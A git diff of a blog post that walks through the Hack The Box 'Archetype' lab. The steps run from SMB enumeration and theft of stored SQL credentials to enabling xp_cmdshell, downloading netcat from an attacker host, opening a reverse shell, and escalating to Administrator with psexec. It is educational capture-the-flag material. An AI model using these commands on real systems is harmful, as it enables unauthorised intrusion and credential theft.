@@ -1,16 +1,15 @@
 ---
 layout: post
 title: 'HTB | Archetype'
-date: 2022-02-28
 permalink: /htb/starting-point/archetype/
 ---
 
 
-# [](#header-4)Enumeration
+# Enumeration
 
 The nmap will show us:
-{% highlight plain %}
-$ nmap -sV 10.129.221.7 -oN nmap 
+{% highlight bash %}
+> nmap -sV 10.129.221.7 -oN nmap 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 11:45 EST
 Nmap scan report for 10.129.221.7
 Host is up (0.049s latency).
@@ -27,8 +26,8 @@ Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds
 {% endhighlight %}
 
 We will try to see which folders are share.
-{% highlight plain %}
-$ smbclient -L //10.129.221.7/
+{% highlight bash %}
+> smbclient -L //10.129.221.7/
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
@@ -39,12 +38,12 @@ $ smbclient -L //10.129.221.7/
 {% endhighlight %}
 
 And then try to connect to **backups**:
-{% highlight plain %}
-$ smbclient //10.129.221.7/backups/
+{% highlight bash %}
+> smbclient //10.129.221.7/backups/
 smb: \> ls
 smb: \> get prod.dtsConfig
 smb: \> exit
-$ cat prod.dtsConfig  
+> cat prod.dtsConfig  
 {% endhighlight %}
 
 There we can see:
@@ -56,52 +55,52 @@ Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
 
 Now we can try to login with the scripts **mssqlclient.py**.
 We will use the credentials provides by the **prod.dtsConfig** file.
-{% highlight plain %}
-$ sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.221.7 -windows-auth
+{% highlight bash %}
+> sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.221.7 -windows-auth
 {% endhighlight %}
 
-# [](#header-4)Foothold
+# Foothold
 
 Now we are in the SQL server. With the command **xp_cmdshell** we can try to execute the shell, but we will recieve the following error:
-{% highlight plain %}
+{% highlight mysql %}
 [-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell'
 {% endhighlight %}
 
 Now we need to activate xp_cmdshell. With the following command we can see all the config aviable.
-{% highlight plain %}
+{% highlight mysql %}
 SQL> sp_configure
 {% endhighlight %}
 
 We need to activate the advanced options:
-{% highlight plain %}
+{% highlight mysql %}
 SQL> EXECUTE sp_configure 'show advanced options', 1;
 SQL> RECONFIGURE;
 {% endhighlight %}
 
 And then we can activate the shell:
-{% highlight plain %}
+{% highlight mysql %}
 SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
 SQL> RECONFIGURE;
 {% endhighlight %}
 
 Now we can get the **user flag**:
-{% highlight plain %}
+{% highlight mysql %}
 SQL> xp_cmdshell type C:\Users\sql_svc\Desktop\user.txt
 {% endhighlight %}
 
 We will make a reverse shell.
 First we will start a nc in the port 443.
-{% highlight plain %}
-$ sudo nc -lvnp 443
+{% highlight bash %}
+> sudo nc -lvnp 443
 {% endhighlight %}
 
 Now we will create a http server in the same folder where we have the **nc64.exe** file.
-{% highlight plain %}
-$ sudo python3 -m http.server 80 
+{% highlight bash %}
+> sudo python3 -m http.server 80 
 {% endhighlight %}
 
 We need to download that file in the server. Because we don't have root access we will use the normal user.
-{% highlight plain %}
+{% highlight mysql %}
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.88/nc64.exe -outfile nc64.exe"
 {% endhighlight %}
 
@@ -111,41 +110,41 @@ The **http.server** will receive the following line:
 {% endhighlight %}
 
 Now we execute the command and send the cmd to the 443 port (where we are listening):
-{% highlight plain %}
+{% highlight mysql %}
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.88 443"
 {% endhighlight %}
 
-# [](#header-4)Privilege Escalation
+# Privilege Escalation
 
 Now we will need to use **winPEAS** to do the privilege escalation. We will change the prompt to powershell, and download the file.
-{% highlight plain %}
+{% highlight batch %}
 C:\Users\sql_svc\Downloads>powershell
 PS C:\Users\sql_svc\Downloads> wget http://10.10.14.88/winPEASx64.exe -outfile winPEASx64.exe
 {% endhighlight %}
 
 In the http.server we can see that works:
-{% highlight plain %}
+{% highlight batch %}
 C:\Users\sql_svc\Downloads>powershell
 10.129.221.7 - - [28/Feb/2022 13:01:29] "GET /winPEASx64.exe HTTP/1.1" 200 -
 {% endhighlight %}
 
 No we will execute the script:
-{% highlight plain %}
+{% highlight batch %}
 PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
 {% endhighlight %}
 
 We can check the shell history for credentials (like **.bash_history**).
-{% highlight plain %}
+{% highlight batch %}
 PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
         net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 {% endhighlight %}
 
 With the password we have now we will use another script from impacket, **psexec.py**:
-{% highlight plain %}
-$ python3 psexec.py administrator@10.129.221.7
+{% highlight bash %}
+> python3 psexec.py administrator@10.129.221.7
 {% endhighlight %}
 
 We can use the password from before and now we are in the Administrator user:
-{% highlight plain %}
+{% highlight batch %}
 C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 {% endhighlight %}
